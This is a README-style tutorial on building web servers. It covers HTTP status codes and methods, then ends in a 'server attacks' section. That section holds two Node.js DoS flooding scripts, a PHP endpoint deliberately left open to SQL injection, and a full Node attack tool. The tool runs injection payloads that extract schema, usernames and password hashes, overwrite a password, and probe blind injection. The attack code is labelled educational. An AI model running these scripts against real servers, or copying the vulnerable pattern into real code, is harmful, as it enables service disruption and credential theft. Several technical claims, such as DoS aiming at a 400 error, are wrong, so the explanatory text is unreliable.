# server-law
How to build a server

# HTTP vs HTTPS
http or Hypertext Transfer Protocol: is a transmition based protacal
https is Secure Hypertext Transfer Protocol: is a  transmition based protacal witch is secured by encryption
> today http nd https sites can be exacly the same, and actualy https sites can be less secure than http ones as codes become lazzy 

![](./licensed-image.jpeg)

# read & write
> save and secure servers follow similar rules to local file rw rules. This means that as a backend engineer you need to limit access to and from users.
> if you give a user the ability to write to a server you must give them access to do so. Often the most simple networking attacks happen because there is a vulnerability which allows for coders to write to a read-only server.
> you must have dedicated read and write ports, which will decrease total server load, and overhead time, while also making better and faster routing.

## static
A static site is a site which can be read from without needing express permission to do so. As an example, government sites are often static, because they have a server managing only redirects.

Static servers can use cookie fishing as well as web-workers to validate a computer; however this does not yet constitute as a dynamic page.
> on a static page you will handle heavy reading and potential writing to a server.
> static servers are often written in non-redirect-ish languages like PHP.
> while most devs hate PHP it offers the best of both languages, allowing you to create HTML sites with non-complex servers. PHP also offers some scalability, for large reading purposes.

## dynamic
A dynamic page is a page which allows for reading as well as writing to a server. In terms of HTTP, dynamic pages use POST, PUT, DELETE, and PATCH requests.

Dynamic pages allow for the introduction of HTML forms; however a page is not solely dynamic because they have forms.

> on a dynamic page there is content which can only be accessed with credentials. Sites such as Facebook, Twitter, and PayPal are examples of early dynamic sites.
> Dynamic sites can be hosted on a number of different programming languages. Large companies will use a mix of languages to help make dynamic sites more scalable.

### dynamic code languages
| Feature                  | Python | Java | Node | PHP |
|--------------------------|--------|------|------|-----|
| Simple to read and write |        | X    |      |     |
| Allows for templating    |        | X    |      | X   |
| Scalable                 |        |      |      |     |
| Routing in site          |        | X    |      | X   |
| static vs non-static     | X      | X    | X    |     |
| Follow file              |        |      |      | X   |

> this table is not a complete difference list, but it shows some of the differences in languages and how you use them to make servers.
> I personally use Node, as it makes scaling up easy, and has some built-in securities that you natively lose in other languages.

## HTTP
HTTP is the language that routers use to connect devices to the World Wide Web (WWW) and allow for users around the world to connect.
When you build a server you are effectively building a high-level version of HTTP which serves both HTML and the routing instructions in one place.

### status
When building a dynamic site you must understand status codes. Status codes are the equivalent of error/warning/success messages when coding.
There are common ranges and uncommon codes which are globally recognized as different types. These ranges are:

1. 100 - 199 (info relay)
2. 200 - 299 (potential server success or location existence)
3. 300 - 399 (warning/redirections and limited access)
4. 400 - 499 (errors relating to location or no access)
5. 500 - 599 (errors from a server or permanent no access)

#### 100

| Code | Description                                                                                                                                                                                                                        | Type                |
|------|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|---------------------|
| 100  | This interim response indicates that the client should continue the request or ignore the response if the request is already finished.                                                                                             | Continue            |
| 101  | This code is sent in response to an Upgrade request header from the client and indicates the protocol the server is switching to.                                                                                                  | Switching Protocols |
| 102  | This code was used in WebDAV contexts to indicate that a request has been received by the server, but no status was available at the time of the response.                                                                         | Processing          |
| 103  | This status code is primarily intended to be used with the Link header, letting the user agent start preloading resources while the server prepares a response or preconnect to an origin from which the page will need resources. | Early Hints         |

#### 200

| Code | Description                                                                                                                                                                           | Type                          |
|------|---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|-------------------------------|
| 200  | The request succeeded. The result and meaning of "success" depends on the HTTP method.                                                                                                | OK                            |
| 201  | The request succeeded, and a new resource was created as a result. This is typically the response sent after POST requests, or some PUT requests.                                     | Created                       |
| 202  | The request has been received but not yet acted upon. It is non-committal, meaning that there is no way for the client to later send a similar request to see if it is still pending. | Accepted                      |
| 203  | This response code means the returned metadata is not exactly the same as is available from the origin server. This is used when a proxy modifies the response.                       | Non-Authoritative Information |
| 204  | There is no content to send for this request, but the headers may be useful. The user-agent may update its cached headers for this resource.                                          | No Content                    |
| 205  | This response code tells the user-agent to reset the document view, like clearing a form or refreshing the page.                                                                      | Reset Content                 |
| 206  | This response code is used when a client requested only part of a resource using the Range header.                                                                                    | Partial Content               |
| 207  | This response code is used to convey information about multiple resources for methods such as WebDAV's batch operations.                                                              | Multi-Status (WebDAV)         |
| 226  | The server has fulfilled a GET request for the resource, and the response is a representation of the result of one or more instance-manipulations applied to the current instance.    | IM Used (HTTP Delta Encoding) |

#### 300

| Code | Description                                                                                                                                                                | Type               |
|------|----------------------------------------------------------------------------------------------------------------------------------------------------------------------------|--------------------|
| 300  | The request has more than one possible response. The user-agent or user should choose one of them.                                                                         | Multiple Choices   |
| 301  | The URL of the requested resource has been changed permanently. The new URL is given in the response.                                                                      | Moved Permanently  |
| 302  | This response code means that the URI of requested resource has been changed temporarily. Further changes in the URI might be made in the future.                          | Found              |
| 303  | The server sent this response to direct the client to get the requested resource at another URI with a GET request.                                                        | See Other          |
| 304  | This is used for caching purposes. It tells the client that the response has not been modified, so the client can continue to use the same cached version of the response. | Not Modified       |
| 307  | The server sends this response to direct the client to get the requested resource at another URI with the same method that was used in the prior request.                  | Temporary Redirect |
| 308  | This means that the resource is now permanently located at another URI, specified by the Location: HTTP Response header.                                                   | Permanent Redirect |

#### 400

| Code | Description                                                                                                                                                                    | Type                          |
|------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|-------------------------------|
| 400  | The server cannot or will not process the request due to something that is perceived to be a client error.                                                                     | Bad Request                   |
| 401  | Authentication is required and has failed or has not yet been provided.                                                                                                        | Unauthorized                  |
| 402  | This response code is reserved for future use. It was originally created for digital payment systems, but is rarely used today.                                                | Payment Required              |
| 403  | The client does not have access rights to the content; that is, it is unauthorized, so the server is refusing to give the requested resource.                                  | Forbidden                     |
| 404  | The server can not find the requested resource. In the browser, this means the URL is not recognized.                                                                          | Not Found                     |
| 405  | The request method is known by the server but is not supported by the target resource.                                                                                         | Method Not Allowed            |
| 406  | This response is sent when the web server, after performing server-driven content negotiation, doesn't find any content that conforms to the criteria given by the user agent. | Not Acceptable                |
| 407  | This is similar to 401 but authentication is needed to be done by a proxy.                                                                                                     | Proxy Authentication Required |
| 408  | This response is sent on an idle connection by some servers, even without any previous request by the client.                                                                  | Request Timeout               |
| 409  | This response is sent when a request conflicts with the current state of the server.                                                                                           | Conflict                      |
| 410  | This response is sent when the requested content has been permanently deleted from server, with no forwarding address.                                                         | Gone                          |
| 411  | The server rejected the request because the Content-Length header field is not defined and the server requires it.                                                             | Length Required               |
| 412  | The client has indicated preconditions in its headers which the server does not meet.                                                                                          | Precondition Failed           |
| 413  | The request entity is larger than limits defined by server.                                                                                                                    | Payload Too Large             |
| 414  | The URI requested by the client is longer than the server is willing to interpret.                                                                                             | URI Too Long                  |
| 415  | The media format of the requested data is not supported by the server, so the server is rejecting the request.                                                                 | Unsupported Media Type        |
| 416  | The range specified by the Range header field in the request cannot be fulfilled.                                                                                              | Range Not Satisfiable         |
| 417  | This response code means the expectation indicated by the Expect request header field cannot be met by the server.                                                             | Expectation Failed            |
| 418  | The server refuses the attempt to brew coffee with a teapot.                                                                                                                   | I'm a teapot                  |
| 429  | The user has sent too many requests in a given amount of time ("rate limiting").                                                                                               | Too Many Requests             |

#### 500

| Code | Description                                                                                                                                                                                                        | Type                            |
|------|--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|---------------------------------|
| 500  | The server has encountered a situation it doesn't know how to handle.                                                                                                                                              | Internal Server Error           |
| 501  | The request method is not supported by the server and cannot be handled.                                                                                                                                           | Not Implemented                 |
| 502  | This error response means that the server, while working as a gateway to get a response needed to handle the request, got an invalid response.                                                                     | Bad Gateway                     |
| 503  | The server is not ready to handle the request. Common causes are a server that is down for maintenance or that is overloaded.                                                                                      | Service Unavailable             |
| 504  | This error response is given when the server is acting as a gateway and cannot get a response in time.                                                                                                             | Gateway Timeout                 |
| 505  | The HTTP version used in the request is not supported by the server.                                                                                                                                               | HTTP Version Not Supported      |
| 506  | The server has an internal configuration error: the chosen variant resource is configured to engage in transparent content negotiation itself, and is therefore not a proper end point in the negotiation process. | Variant Also Negotiates         |
| 507  | The method could not be performed on the resource because the server is unable to store the representation needed to successfully complete the request.                                                            | Insufficient Storage (WebDAV)   |
| 508  | The server detected an infinite loop while processing the request.                                                                                                                                                 | Loop Detected (WebDAV)          |
| 510  | Further extensions to the request are required for the server to fulfill it.                                                                                                                                       | Not Extended                    |
| 511  | The client needs to authenticate to gain network access.                                                                                                                                                           | Network Authentication Required |

> as a note http allows you to change the message/descrption of an error; however if you are builiding an api this is not recomended as it can have unanticipted affects on the server, and users requesting

## HTTP Methods

HTTP methods define the types of actions that can be performed on resources. Understanding these methods is crucial for building RESTful APIs and web services.

| Method  | Description                                                                                                                                   | Access Level | Form-compatible |
|---------|-----------------------------------------------------------------------------------------------------------------------------------------------|--------------|-----------------|
| GET     | Requests a representation of the specified resource. These requests should only retrieve data and have no other effect.                       | Read         | Yes             |
| POST    | Submits data to be processed to a specified resource. The data is included in the body of the request. Often used for creating new resources. | Write        | Yes             |
| PUT     | Replaces all current representations of the target resource with the request payload. Used to update existing resources.                      | Write        | No*             |
| DELETE  | Deletes the specified resource.                                                                                                               | Write        | No*             |
| HEAD    | Similar to GET, but transfers the status line and header section only (no response body).                                                     | Read         | No              |
| OPTIONS | Describes the communication options for the target resource. Often used for CORS preflight requests.                                          | Read         | No              |
| PATCH   | Applies partial modifications to a resource. Unlike PUT, which replaces the entire resource.                                                  | Write        | No*             |
| CONNECT | Establishes a tunnel to the server identified by the target resource. Often used for SSL tunneling.                                           | Special      | No              |
| TRACE   | Performs a message loop-back test along the path to the target resource. Primarily used for debugging.                                        | Special      | No              |

> *Note: While PUT, DELETE, and PATCH are not directly compatible with HTML forms (which only natively support GET and POST), modern web applications often use JavaScript to issue these requests. Additionally, form methods can be overridden using the _method parameter with frameworks like Express.js.
> *Note: Most servers only use GET, POST, PUT, DELETE as their HTTP methods. SSL, FTP will use CONNECT, OPTIONS, and potentially TRACE. SMTP and POP servers use different protocols entirely.

# Coding
Often coders will start coding both front end and backend code together; however, this leads to horrible code, and heavy re-use.
The back end of a website is usually code which directs a user to points predefined by the server; while, the front end is a "physical" location which users interact with via calls HTTP Methods to the backend.
A GUI or app follow similar rules, allowing for a seamless interaction between the two (backend via server calls) and (front end via a "physical" window for users to interact with)
Almost every coding language offers HTTP/HTTPS protocols for either sites or applications.

For app design the common coding languages are Swift, Objective-C, Kotlin, and Java as they allow for the creation of integrated system interfaces
For site design there are a whole host of templating, pre-processors, and HTML-like languages.


> In Node you can use EJS, a JavaScript-like framework which allows rendering of static content in a seemingly dynamic way
Node also allows for PHP-lite, as well as a whole host of some other frameworks
In Kotlin, RHTML is a common templating language as it has simple integration
In Java you have limited templates outside of Maven or Gradle architectures

> For solely frontend web usage use:
* React
* Next.js
* Vue
* etc...

> These are languages in on themselves, allowing for front end creation in real time

> For backend we are limited in frameworks:

* For Python we use Django
* In Node we can use Express or HTTP
* In Java we use Spring Boot
* In PHP we use Laravel
* In Ruby we use Rails
* In Go we use Gin or Echo


### Why
so why is it that we seperate all of the frontend, backend, and app desighn? 
This is due to security reasons. If your server and website touch (as in they are one in the same) users can directly acsess your servers code.
*Note* the only eexseption to this is php, witch forces the mixing of toutes to file witch witchout extea code would allow hackers to acsess sensitive data.

when building a save to acsess site for users you must hae multible dedicated locations
1. most programes seperate this into many section 
   1. backend
      1. routes
      2. server
      3. security
      3. databse
   2. frontend
      1. page
      2. fetching
      3. polling?
      4. sessions?
      5. databse?
      6. memeroy que*
   3. apps/gui
      1. language spacific fetchign protocall
      2. local vs global server
      3. window/frame integration
      4. package management
      5. frame by frame integration (on login is it save to progress)
      
> by following this simple use case, you can make simple servers witch can view and modify servers


## building good vs bad servers
the concept of a good vs bad server relates to a servers ability to be penatrated by outside influences. 
later on i will talk about DDOs, DOS, sql injuction, and more, but basicly if any of those thingngs can happen to your sereve it is bad
when buildig apis we will see how the integrqation of web based tokens (barers) can prefent attacks.
We will also look at how encryping sessins while ok, dose not garnetee server evecency or security. 

#### bad

##### server attacks
via a whole slue of langages we can attack servers.
*Note* this section is educational

###### DOS and DDOS
A dos attack is where a programmer flouds a server with the intention of reciving a [400 error code](#400), effectively stopping that serves. DDos attaces are the same thing, but are disptrabuted, alloing the attacks to happen from arround theworld. 
DDos attacs are much harder to preven has trafic could come from anyware, making dedicated server prefention dificult. In addition DDOs attackes are often done by infectiong millions of computers with malware. For this project i will not show how to build this.
using js (DOS)
```node

// Basic DoS attack in Node.js
// This infinitely sends requests to a target without waiting for responses
while (true) {
    fetch("https://target-server.com").then(res => {
        console.log("Request sent");
    }).catch(err => {
        console.log("Error, retrying...");
    });
}
```
using node.js (DOS)
``` node
// More sophisticated version using concurrent requests
// This creates multiple concurrent connections, potentially overwhelming the server
const axios = require('axios');

const targetUrl = "https://target-server.com";
const concurrentRequests = 100;
const intervalMs = 10;

function sendRequest() {
    axios.get(targetUrl)
        .catch(error => console.log("Request failed, continuing..."));
}

// Launch multiple requests in short intervals
setInterval(() => {
    for (let i = 0; i < concurrentRequests; i++) {
        sendRequest();
    }
}, intervalMs);

```
> DOS attacks are valid ways to stress test your server, but make sure you understand the implactions on youre server when running them.

###### sql injections
as a note this is specific to servers with [integrated use](#building-good-vs-bad-servers).
Before we talk about injections you must understand about payloads. Payloads are sets of instructions witch a coptuer will follow, to attempt to attack. 
As an example of a payload coders will often use c,c++, or rust (They are super fast) to produce password cracking payload


> PHP Application Vulnerable to SQL Injection

> This code demonstrates a classic SQL injection vulnerability. 
> Here's why this application is vulnerable:
Unsanitized Input: The application takes user input directly from the URL parameter user_id without any validation or sanitization.
Direct Insertion into SQL Query: The code directly concatenates this input into the SQL query string.
To exploit this vulnerability, an attacker could input values like:
1 OR 1=1 - This would return all users in the database instead of just one
1; DROP TABLE users -- - This could delete the entire users table
1 UNION SELECT 1,database(),user(),4 -- - This could reveal database information
For educational purposes, I included a simple HTML form to test different inputs and some example attack vectors.
To fix this vulnerability, you would need to use prepared statements or properly sanitize the input. Would you like me to show a secure version of this code as well?

> php serve witch is rive for sql injection
```php
<?php
// Database configuration
$host = "localhost";
$username = "db_user";
$password = "db_password";
$database = "example_db";

// Connect to database
$conn = mysqli_connect($host, $username, $password, $database);

// Check connection
if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}

// Handle route for user data retrieval (VULNERABLE to SQL injection)
if (isset($_GET['user_id'])) {
    $userId = $_GET['user_id']; // User input is not sanitized
    
    // Vulnerable query - directly inserting user input into SQL
    $query = "SELECT * FROM users WHERE id = " . $userId;
    
    // Execute query
    $result = mysqli_query($conn, $query);
    
    if ($result) {
        echo "<h2>User Information</h2>";
        echo "<table border='1'>";
        echo "<tr><th>ID</th><th>Username</th><th>Email</th></tr>";
        
        while ($row = mysqli_fetch_assoc($result)) {
            echo "<tr>";
            echo "<td>" . $row['id'] . "</td>";
            echo "<td>" . $row['username'] . "</td>";
            echo "<td>" . $row['email'] . "</td>";
            echo "</tr>";
        }
        
        echo "</table>";
    } else {
        echo "Error executing query: " . mysqli_error($conn);
    }
}
?>
```

> this scriot expots this

```node 
const axios = require('axios');
const cheerio = require('cheerio');

// Target vulnerable PHP application URL
const targetUrl = 'http://example.com/vulnerable_app.php';

// SQL Injection payloads to demonstrate different attacks
const sqlInjectionPayloads = [
  {
    name: "Return all users",
    payload: "1 OR 1=1",
    description: "This bypasses the WHERE clause condition to return all users in the database."
  },
  {
    name: "Database information",
    payload: "1 UNION SELECT 1,database(),user(),version()",
    description: "This extracts the database name, current user, and database version."
  },
  {
    name: "Table information",
    payload: "1 UNION SELECT 1,table_name,table_schema,4 FROM information_schema.tables WHERE table_schema NOT IN ('mysql','information_schema','performance_schema')",
    description: "This retrieves table names from the current database schema."
  },
  {
    name: "Column information",
    payload: "1 UNION SELECT 1,column_name,data_type,table_name FROM information_schema.columns WHERE table_name='users'",
    description: "This retrieves column names and data types from the users table."
  },
  {
    name: "Extract credentials",
    payload: "1 UNION SELECT id,username,password,email FROM users",
    description: "This attempts to extract usernames and password hashes."
  },
  {
    name: "Destructive attack",
    payload: "1; UPDATE users SET password='hacked' WHERE id=1",
    description: "This attempts to change the admin password. (Commented out for safety)"
  }
];

// Function to parse and display the results from the vulnerable page
async function parseResults(html) {
  const $ = cheerio.load(html);
  const tableData = [];
  
  // Extract table headers
  const headers = [];
  $('table tr th').each((i, el) => {
    headers.push($(el).text().trim());
  });
  
  // Extract table rows
  $('table tr').each((i, row) => {
    if (i > 0) { // Skip header row
      const rowData = {};
      $(row).find('td').each((j, cell) => {
        rowData[headers[j] || `Column${j}`] = $(cell).text().trim();
      });
      if (Object.keys(rowData).length > 0) {
        tableData.push(rowData);
      }
    }
  });
  
  return tableData;
}

// Execute SQL injection attacks
async function executeSqlInjectionAttacks() {
  console.log('Starting SQL Injection Attack Demonstration');
  console.log('===========================================');
  
  for (const attack of sqlInjectionPayloads) {
    console.log(`\n[*] Executing: ${attack.name}`);
    console.log(`[*] Payload: ${attack.payload}`);
    console.log(`[*] Description: ${attack.description}`);
    
    try {
      const response = await axios.get(`${targetUrl}?user_id=${encodeURIComponent(attack.payload)}`);
      
      if (response.status === 200) {
        console.log('[+] Attack successful!');
        
        // Parse and display the extracted data
        const results = await parseResults(response.data);
        if (results.length > 0) {
          console.log('[+] Extracted data:');
          console.table(results);
        } else {
          console.log('[!] No data returned or could not parse the response.');
          // Display raw response for debugging
          console.log('[+] Raw HTML snippet:');
          console.log(response.data.slice(0, 500) + '...');
        }
      } else {
        console.log(`[!] Request failed with status code: ${response.status}`);
      }
    } catch (error) {
      console.error(`[!] Error during attack: ${error.message}`);
      if (error.response) {
        console.log(`[!] Server response: ${error.response.status} - ${error.response.statusText}`);
      }
    }
    
    console.log('-------------------------------------------');
  }
}

// Execute basic blind SQL injection test
async function testBlindSqlInjection() {
  console.log('\n[*] Testing for blind SQL injection vulnerabilities');
  
  const testCases = [
    { payload: "1 AND 1=1", expectedSuccess: true },
    { payload: "1 AND 1=2", expectedSuccess: false },
    { payload: "1 AND (SELECT SLEEP(2))", timing: true }
  ];
  
  for (const test of testCases) {
    console.log(`[*] Testing payload: ${test.payload}`);
    
    try {
      const startTime = Date.now();
      const response = await axios.get(`${targetUrl}?user_id=${encodeURIComponent(test.payload)}`);
      const elapsedTime = Date.now() - startTime;
      
      if (test.timing) {
        console.log(`[+] Response time: ${elapsedTime}ms`);
        if (elapsedTime > 2000) {
          console.log('[+] Time-based blind injection appears to work!');
        } else {
          console.log('[!] Time-based blind injection test inconclusive.');
        }
      } else {
        const hasData = response.data.includes('User Information') && !response.data.includes('Error executing query');
        console.log(`[+] Response indicates success: ${hasData}`);
        if ((test.expectedSuccess && hasData) || (!test.expectedSuccess && !hasData)) {
          console.log('[+] Boolean-based blind injection appears to work!');
        }
      }
    } catch (error) {
      console.error(`[!] Error: ${error.message}`);
    }
  }
}

// Main function
async function main() {
  console.log('SQL Injection Attack Demonstration Tool');
  console.log('======================================');
  console.log(`Target: ${targetUrl}`);
  console.log('--------------------------------------');
  
  // Run the attacks
  await executeSqlInjectionAttacks();
  
  // Test for blind SQL injection
  await testBlindSqlInjection();
  
  console.log('\n[*] Attack demonstration completed');
}

// Run the main function
main().catch(error => {
  console.error('Fatal error:', error);
});
```
